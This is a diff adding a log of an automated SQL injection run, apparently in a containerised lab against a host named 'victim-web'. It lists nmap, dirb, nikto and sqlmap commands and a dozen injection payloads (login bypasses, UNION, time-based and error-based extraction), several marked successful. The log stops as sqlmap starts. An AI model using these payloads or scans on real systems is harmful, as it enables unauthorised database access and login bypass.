@@ -1,0 +1,41 @@
+2025-07-21 11:48:24,707 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
+2025-07-21 11:48:24,707 - INFO - Container ID: attacker
+2025-07-21 11:48:24,707 - INFO - Target: http://victim-web:80
+2025-07-21 11:48:24,707 - INFO - Attack Type: sql_injection
+2025-07-21 11:48:24,707 - INFO - ============================================================
+2025-07-21 11:48:24,707 - INFO - === Testing Container Connectivity ===
+2025-07-21 11:48:24,710 - INFO - [+] Successfully connected to http://victim-web:80
+2025-07-21 11:48:24,711 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
+2025-07-21 11:48:24,711 - INFO - === Network Reconnaissance Phase ===
+2025-07-21 11:48:24,711 - INFO - Running: nmap -sS -p- victim-web
+2025-07-21 11:48:25,336 - INFO - [+] Nmap scan completed with return code: 0
+2025-07-21 11:48:30,339 - INFO - === Web Application Enumeration Phase ===
+2025-07-21 11:48:30,340 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
+2025-07-21 11:48:31,256 - INFO - [+] Dirb scan completed with return code: 0
+2025-07-21 11:48:31,256 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
+2025-07-21 11:48:38,229 - INFO - [+] Nikto scan completed with return code: 0
+2025-07-21 11:48:43,251 - INFO - === Custom SQL Injection Phase ===
+2025-07-21 11:48:43,252 - INFO - [+] Custom Login Attack 1: admin' --
+2025-07-21 11:48:43,278 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-21 11:48:45,875 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
+2025-07-21 11:48:45,880 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-21 11:48:48,325 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
+2025-07-21 11:48:48,341 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-21 11:48:49,967 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
+2025-07-21 11:48:49,982 - INFO -     Status: 200, SQL Error: True, Success: False
+2025-07-21 11:48:51,941 - INFO - [+] Custom Login Attack 5: admin'/*
+2025-07-21 11:48:51,944 - INFO -     Status: 200, SQL Error: False, Success: True
+2025-07-21 11:48:54,936 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
+2025-07-21 11:48:54,951 - INFO -     Status: 200, SQL Error: False, Success: False
+2025-07-21 11:48:57,719 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
+2025-07-21 11:48:57,734 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-21 11:48:59,985 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
+2025-07-21 11:48:59,994 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-21 11:49:01,784 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
+2025-07-21 11:49:01,802 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-21 11:49:04,458 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
+2025-07-21 11:49:04,475 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-21 11:49:06,429 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
+2025-07-21 11:49:06,443 - INFO -     Status: 200, SQL Error: False, Time-based: False
+2025-07-21 11:49:12,578 - INFO - === SQLMap Automated Testing Phase ===
+2025-07-21 11:49:12,579 - INFO - Running SQLMap login test: sqlmap -u 'http://victim-web:80/login.php?user=*&pass=*' --batch --random-agent --threads=1 --delay=120 --time-sec=10 --risk=1 --level=1 --output-dir=/opt/output/sqlmap_login
